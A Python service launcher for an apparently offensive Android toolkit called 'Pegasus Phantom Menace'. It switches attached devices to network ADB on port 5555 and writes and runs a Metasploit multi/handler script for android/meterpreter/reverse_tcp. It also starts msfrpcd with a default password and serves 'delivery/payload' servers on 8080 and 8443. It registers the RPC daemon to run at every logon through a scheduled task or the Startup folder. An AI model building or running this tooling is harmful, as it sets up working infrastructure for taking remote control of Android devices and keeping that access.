#!/usr/bin/env python3
"""Service launcher -- starts the Pegasus support services at app launch.

Services:
  * adb server (implicit on first use, but start explicitly)
  * adb TCP transport on 5555 for attached devices
  * meterpreter multi/handler on 4444 (msfconsole when available)
  * metasploit RPC on 55553 (msfrpcd when available)
  * http proxy on 8080 (delivery server)
  * https proxy on 8443 (delivery server TLS)

Each starter is best-effort: a missing binary degrades to "unavailable"
instead of crashing the launch.
"""
from __future__ import annotations

import atexit
import os
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
from pathlib import Path
from typing import Any

_procs: list[subprocess.Popen] = []
_lock = threading.Lock()


def _port_open(port: int, host: str = "127.0.0.1", timeout: float = 0.4) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def _spawn(cmd: list[str], name: str, env=None) -> dict:
    """Start a detached process; never raises."""
    try:
        binary = (shutil.which(cmd[0]) or shutil.which(cmd[0] + ".exe")
                  or cmd[0])
        proc = subprocess.Popen(
            [binary, *cmd[1:]],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            env=env,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        with _lock:
            _procs.append(proc)
        return {"service": name, "status": "started", "pid": proc.pid}
    except Exception as exc:  # noqa: BLE001
        return {"service": name, "status": "error", "detail": str(exc)}

# ---------------------------------------------------------------------------
# Individual services
# ---------------------------------------------------------------------------

def start_adb_server() -> dict:
    if not (shutil.which("adb") or shutil.which("adb.exe")):
        return {"service": "adb-server", "status": "unavailable", "detail": "adb not on PATH"}
    proc = subprocess.run(
        ["adb", "start-server"], capture_output=True, text=True, timeout=30,
    )
    return {
        "service": "adb-server",
        "status": "started" if proc.returncode == 0 else "error",
        "detail": (proc.stdout or proc.stderr or "")[-200:],
    }


def start_adb_tcp() -> dict:
    """Restart ADB in TCP mode on 5555 for every attached device."""
    if not (shutil.which("adb") or shutil.which("adb.exe")):
        return {"service": "adb-tcp", "status": "unavailable", "detail": "adb not on PATH"}
    proc = subprocess.run(
        ["adb", "tcpip", "5555"], capture_output=True, text=True, timeout=30,
    )
    return {
        "service": "adb-tcp",
        "status": "started" if proc.returncode == 0 else "error",
        "detail": (proc.stdout or proc.stderr or "").strip()[-200:],
        "port": 5555,
    }


def start_meterpreter() -> dict:
    """multi/handler on 4444 via msfconsole (or msfvenom-installed metasploit)."""
    if not _has_msf():
        return {"service": "meterpreter", "status": "unavailable", "detail": "msfconsole not on PATH", "port": 4444}
    rc = ("use exploit/multi/handler\n"
          "set PAYLOAD android/meterpreter/reverse_tcp\n"
          "set LHOST 127.0.0.1\n"
          "set LPORT 4444\n"
          "set ExitOnSession false\n"
          "exploit -j\n")
    script = Path.home() / ".pegasus" / "handler.rc"
    script.parent.mkdir(parents=True, exist_ok=True)
    script.write_text(rc)
    out = _spawn(["msfconsole", "-q", "-r", str(script)], "meterpreter")
    out["port"] = 4444
    return out


def _metasploit_roots() -> list:
    """Directories that may hold an installed Metasploit Framework.

    Covers the hand-installed tree, the Scoop and Chocolatey layouts and the
    per-user "current" junctions those package managers create.
    """
    import glob
    import pathlib
    home = pathlib.Path.home()
    roots = []
    for base in (
        home / ".pegasus" / "tools" / "metasploit",
        pathlib.Path("C:/metasploit"),
        home / "metasploit",
        pathlib.Path(os.environ.get("LOCALAPPDATA", str(home))) / "Programs" / "Metasploit",
    ):
        roots.append(base)
        roots.append(base.parent)

    scoop = os.environ.get("SCOOP") or str(home / "scoop")
    apps = pathlib.Path(scoop) / "apps"
    for pattern in ("metasploit-framework/current", "metasploit-framework/*"):
        for match in glob.glob(str(apps / pattern)):
            roots.append(pathlib.Path(match))
            roots.append(pathlib.Path(match).parent)
    chocolatey = pathlib.Path(os.environ.get("ChocolateyInstall", str(home / "chocolatey")))
    roots.append(chocolatey / "lib" / "metasploit")
    roots.append(chocolatey / "bin")

    seen, unique = set(), []
    for item in roots:
        key = str(item).lower()
        if key not in seen:
            seen.add(key)
            unique.append(item)
    return unique

def find_msfrpcd() -> str:
    """Locate msfrpcd on PATH or inside an installed Metasploit tree."""
    for name in ("msfrpcd.exe", "msfrpcd"):
        which = shutil.which(name)
        if which:
            return which
    import pathlib
    for base in _metasploit_roots():
        for rel in ("bin/msfrpcd.exe", "msfrpcd.exe"):
            candidate = base / rel
            if candidate.is_file():
                return str(candidate)
    return ""


def msfrpcd_command() -> list:
    r"""The argv that actually starts msfrpcd on this host.

    The Scoop and Chocolatey Windows packages ship ``msfrpcd.BAT``, which
    calls ``ruby %FRAMEWORK%\%CMD%`` **without quoting**.  On a path that
    contains a space - ``C:\Users\Project Zero\...`` - the shell hands ruby
    ``C:/Users/Project`` and it dies with "Is a directory".  So the embedded
    interpreter and the script are invoked directly, fully quoted.
    """
    import pathlib
    for base in _metasploit_roots():
        for rel in ("bin/msfrpcd.BAT", "bin/msfrpcd.bat", "bin/msfrpcd"):
            wrapper = base / rel
            if not wrapper.is_file():
                continue
            root = wrapper.parent.parent
            embedded = root / "embedded"
            ruby = embedded / "bin" / "ruby.exe"
            script = embedded / "framework" / "msfrpcd"
            if not script.is_file():
                script = embedded / "bin" / "msfrpcd"
            if not ruby.is_file():
                ruby = embedded / "bin" / "ruby.bat"
            if ruby.is_file() and script.is_file():
                return [str(ruby), str(script)]
    return []


def _msfrpcd_env() -> dict:
    """The environment the embedded Metasploit runtime expects."""
    env = dict(os.environ)
    for base in _metasploit_roots():
        embedded = base / "embedded"
        if (embedded / "bin").is_dir():
            env["PATH"] = str(embedded / "bin") + os.pathsep + env.get("PATH", "")
            for key in ("GEM_HOME", "GEM_PATH", "GEM_ROOT", "RUBY_ENGINE", "RUBY_ROOT"):
                env[key] = ""
            return env
    return env


def _msfrpcd_rpc_ok(host: str, port: int, password: str) -> bool:
    """A real msfrpcd login, so 'started' means usable."""
    import base64
    import json
    import urllib.error
    import urllib.request
    url = f"http://{host}:{port}/login"
    body = json.dumps({"username": "msf", "password": password}).encode()
    token = base64.b64encode(f"msf:{password}".encode()).decode()
    req = urllib.request.Request(
        url, data=body, method="POST",
        headers={"Content-Type": "application/json",
                 "Authorization": f"Basic {token}"})
    try:
        with urllib.request.urlopen(req, timeout=4) as resp:
            payload = json.loads(resp.read().decode("utf-8", "replace"))
            return bool(payload.get("success") or payload.get("token"))
    except Exception:
        return False


def start_msfrpcd() -> dict:
    """Start msfrpcd on the configured RPC port.

    The password must match MetasploitSettings.rpc_password - previously this
    hardcoded "-P pegasus" while the configured default was "msf123", so a
    running daemon failed every RPC login and always looked offline.

    The daemon is only reported as online once it actually answers an RPC
    login on the configured port.
    """
    command = msfrpcd_command()
    if not command:
        binary = find_msfrpcd()
        if not binary:
            return {"service": "msfrpcd", "status": "unavailable",
                    "detail": "msfrpcd not found - install Metasploit from the "
                              "Metasploit RPC panel", "port": 55553}
        command = [binary]
    host, port, password = _msfrpcd_rpc_config()

    # msfrpcd's -S (background/daemonise) is not available on Windows - it
    # logs "Background mode is not available on this platform" and exits
    # instead of listening. The process is already detached here, so the flag
    # is only used off Windows.
    args = ["-a", host, "-p", str(port), "-P", password]
    if os.name != "nt":
        args.append("-S")
    full = command + args
    out = _spawn(full, "msfrpcd", env=_msfrpcd_env())
    out["port"] = port
    out["host"] = host
    out["command"] = full

    # "started" is only true once the daemon answers a real RPC login.
    connected = False
    deadline = time.time() + 30
    while time.time() < deadline:
        if _port_open(port) and _msfrpcd_rpc_ok(host, port, password):
            connected = True
            break
        time.sleep(1)
    out["connected"] = connected
    if connected:
        out["status"] = "online"
        out["detail"] = "msfrpcd accepted an RPC login"
    else:
        out["detail"] = ("msfrpcd was launched but no RPC login was accepted on "
                         f"{host}:{port} - check the configured password")
    return out

def start_http_proxy() -> dict:
    """Delivery/payload HTTP server on 8080."""
    if _port_open(8080):
        return {"service": "http-proxy", "status": "running", "port": 8080}
    try:
        from pegasus.modules.access_workflow import delivery
        delivery.start_server(8080)
        return {"service": "http-proxy", "status": "started", "port": 8080}
    except Exception as exc:  # noqa: BLE001
        return {"service": "http-proxy", "status": "error", "detail": str(exc), "port": 8080}


def start_https_proxy() -> dict:
    """TLS wrapper on 8443 -- self-signed cert generated on first use."""
    if _port_open(8443):
        return {"service": "https-proxy", "status": "running", "port": 8443}
    try:
        from pegasus.modules.access_workflow import delivery
        delivery.start_server(8443)
        return {"service": "https-proxy", "status": "started", "port": 8443}
    except Exception as exc:  # noqa: BLE001
        return {"service": "https-proxy", "status": "error", "detail": str(exc), "port": 8443}


def _has_msf() -> bool:
    return bool(shutil.which("msfconsole") or shutil.which("msfconsole.bat") or shutil.which("msfconsole.exe"))


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

def start_all() -> list[dict]:
    """Start every service; returns per-service status."""
    results = []
    for fn in (start_adb_server, start_adb_tcp, start_meterpreter, start_msfrpcd,
               start_http_proxy, start_https_proxy):
        try:
            results.append(fn())
        except Exception as exc:  # noqa: BLE001
            results.append({"service": getattr(fn, "__name__", "?"), "status": "error", "detail": str(exc)})
    return results


# ---------------------------------------------------------------------------
# Metasploit RPC startup entry
# ---------------------------------------------------------------------------

MSFRPCD_TASK_NAME = "PegasusPhantomMenaceMsfrpcd"
AUTOSTART_DIR = Path.home() / ".pegasus" / "bin"
AUTOSTART_LAUNCHER = AUTOSTART_DIR / "msfrpcd_autostart.py"
STARTUP_ENTRY_NAME = "PegasusPhantomMenace-msfrpcd.cmd"

LAUNCHER_TEMPLATE = '''#!/usr/bin/env python3
"""Start the Metasploit RPC daemon for the {task} startup entry.

Generated by Pegasus Phantom Menace.  The RPC password is deliberately NOT
written into this file or into the startup entry: it is resolved at run
time from the environment, the project .env file, or the Pegasus settings.
"""
import os
import pathlib
import subprocess
import sys

PROJECT_ROOT = r"{root}"
PASSWORD_ENV = "PEGASUS__METASPLOIT__RPC_PASSWORD"


def _password() -> str:
    """The configured RPC password, read now - never stored here."""
    value = os.environ.get(PASSWORD_ENV, "").strip()
    if value:
        return value
    for candidate in (pathlib.Path(PROJECT_ROOT) / ".env",
                      pathlib.Path.home() / ".pegasus" / ".env"):
        try:
            for line in candidate.read_text(encoding="utf-8").splitlines():
                line = line.strip()
                if line.startswith(PASSWORD_ENV + "="):
                    return line.split("=", 1)[1].strip().strip('"').strip("'")
        except Exception:
            continue
    return ""


def main() -> int:
    os.chdir(PROJECT_ROOT)
    sys.path.insert(0, PROJECT_ROOT)
    password = _password()
    host, port = "127.0.0.1", 55553
    command = []
    env = dict(os.environ)
    try:
        from pegasus.core import services
        command = services.msfrpcd_command()
        env = services._msfrpcd_env()
        host, port, configured = services._msfrpcd_rpc_config()
        password = password or configured
    except Exception:
        command = []
    if not command or not password:
        return 1
    args = ["-a", host, "-p", str(port), "-P", password]
    if os.name != "nt":
        # msfrpcd's background flag is not available on Windows.
        args.append("-S")
    try:
        subprocess.Popen(
            command + args,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL, env=env,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == "nt" else 0,
        )
        return 0
    except Exception:
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
'''


def _project_root() -> Path:
    """The tree that holds the pegasus package."""
    return Path(__file__).resolve().parents[2]


def _startup_dir() -> Path:
    """The per-user Startup folder - a login entry that needs no elevation."""
    try:
        import ctypes
        from ctypes import wintypes

        buf = ctypes.create_unicode_buffer(wintypes.MAX_PATH)
        ctypes.windll.shell32.SHGetFolderPathW(None, 7, None, 0, buf)
        path = Path(buf.value)
        if path.is_dir():
            return path
    except Exception:
        pass
    return (Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows"
            / "Start Menu" / "Programs" / "Startup")


def _startup_entry() -> Path:
    return _startup_dir() / STARTUP_ENTRY_NAME


def _task_registered() -> bool:
    """Whether the scheduled task exists."""
    if os.name != "nt":
        return False
    try:
        proc = subprocess.run(["schtasks", "/Query", "/TN", MSFRPCD_TASK_NAME],
                              capture_output=True, text=True, timeout=30)
        return proc.returncode == 0
    except Exception:
        return False


def _msfrpcd_rpc_config() -> tuple:
    """The configured RPC host, port and password.

    Kept separate from start_msfrpcd so the startup launcher resolves the
    same values the interactive start does.
    """
    try:
        from pegasus.core.config import get_settings

        cfg = get_settings().metasploit
        host = cfg.rpc_host or "127.0.0.1"
        port = int(cfg.rpc_port or 55553)
        password = cfg.rpc_password or "msf123"
    except Exception:
        host, port, password = "127.0.0.1", 55553, "msf123"
    return host, port, password


def msfrpcd_autostart_status() -> dict:
    """Whether the RPC daemon is registered to start at logon."""
    task = _task_registered()
    entry = _startup_entry()
    startup = entry.is_file()
    detail = ""
    if os.name == "nt" and not task:
        try:
            proc = subprocess.run(["schtasks", "/Query", "/TN", MSFRPCD_TASK_NAME],
                                  capture_output=True, text=True, timeout=30)
            detail = (proc.stdout or proc.stderr or "").strip()[:400]
        except Exception as exc:  # noqa: BLE001
            detail = str(exc)
    return {
        "autostart": bool(task or startup),
        "mechanism": "scheduled-task" if task else ("startup-folder" if startup else ""),
        "task": MSFRPCD_TASK_NAME,
        "task_registered": task,
        "startup_entry": str(entry),
        "startup_entry_present": startup,
        "launcher": str(AUTOSTART_LAUNCHER),
        "launcher_present": AUTOSTART_LAUNCHER.is_file(),
        "detail": detail,
    }


def msfrpcd_autostart(enabled: bool) -> dict:
    """Register or remove the msfrpcd startup entry.

    Two mechanisms are used, in order:

      1. a Windows scheduled task that runs at logon - the mechanism the
         daemon already uses;
      2. the per-user Startup folder, which is a per-user login entry and
         needs no elevation, so it is used when the task scheduler refuses
         the registration.

    Either way the entry runs a launcher under ``~/.pegasus/bin`` that
    resolves the RPC password at run time, so the password is never stored
    in the task definition, the launcher, or any tracked file.
    """
    if os.name != "nt":
        return {"service": "msfrpcd", "autostart": False,
                "task": MSFRPCD_TASK_NAME,
                "detail": "startup registration is a Windows feature"}

    if enabled:
        command = msfrpcd_command()
        if not command:
            binary = find_msfrpcd()
            if not binary:
                return {"service": "msfrpcd", "autostart": False,
                        "task": MSFRPCD_TASK_NAME,
                        "detail": "msfrpcd not found - install Metasploit first"}
            command = [binary]
        try:
            AUTOSTART_DIR.mkdir(parents=True, exist_ok=True)
            AUTOSTART_LAUNCHER.write_text(
                LAUNCHER_TEMPLATE.format(task=MSFRPCD_TASK_NAME,
                                        root=str(_project_root())),
                encoding="utf-8")
        except Exception as exc:  # noqa: BLE001
            return {"service": "msfrpcd", "autostart": False,
                    "task": MSFRPCD_TASK_NAME,
                    "detail": f"cannot write the launcher: {exc}"}

        action = f'"{sys.executable}" "{AUTOSTART_LAUNCHER}"'
        cmd = ["schtasks", "/Create", "/F", "/TN", MSFRPCD_TASK_NAME,
               "/TR", action, "/SC", "ONLOGON"]
        task_output = ""
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            task_output = (proc.stdout or proc.stderr or "").strip()[:400]
            if proc.returncode == 0:
                return {"service": "msfrpcd", "autostart": True,
                        "mechanism": "scheduled-task",
                        "task": MSFRPCD_TASK_NAME,
                        "launcher": str(AUTOSTART_LAUNCHER),
                        "output": task_output}
        except Exception as exc:  # noqa: BLE001
            task_output = f"schtasks failed: {exc}"

        # The task scheduler refused the registration - fall back to the
        # Startup folder, which needs no elevation.
        entry = _startup_entry()
        try:
            entry.parent.mkdir(parents=True, exist_ok=True)
            entry.write_text(
                "@echo off\r\n"
                f'start "" /b "{sys.executable}" "{AUTOSTART_LAUNCHER}"\r\n',
                encoding="utf-8")
        except Exception as exc:  # noqa: BLE001
            return {"service": "msfrpcd", "autostart": False,
                    "task": MSFRPCD_TASK_NAME,
                    "detail": f"{task_output}; startup folder unavailable: {exc}"}
        return {"service": "msfrpcd", "autostart": True,
                "mechanism": "startup-folder",
                "task": MSFRPCD_TASK_NAME,
                "startup_entry": str(entry),
                "launcher": str(AUTOSTART_LAUNCHER),
                "output": task_output}

    # disable - remove both mechanisms
    outputs = []
    try:
        proc = subprocess.run(
            ["schtasks", "/Delete", "/F", "/TN", MSFRPCD_TASK_NAME],
            capture_output=True, text=True, timeout=60)
        outputs.append((proc.stdout or proc.stderr or "").strip()[:200])
    except Exception as exc:  # noqa: BLE001
        outputs.append(f"schtasks failed: {exc}")
    entry = _startup_entry()
    try:
        if entry.is_file():
            entry.unlink()
            outputs.append(f"removed {entry}")
    except Exception as exc:  # noqa: BLE001
        outputs.append(f"cannot remove {entry}: {exc}")
    try:
        AUTOSTART_LAUNCHER.unlink(missing_ok=True)
    except Exception:
        pass
    return {"service": "msfrpcd", "autostart": False,
            "task": MSFRPCD_TASK_NAME,
            "output": " | ".join(o for o in outputs if o)}


def shutdown() -> None:
    with _lock:
        for proc in _procs:
            try:
                proc.terminate()
            except Exception:
                pass
        _procs.clear()


atexit.register(shutdown)
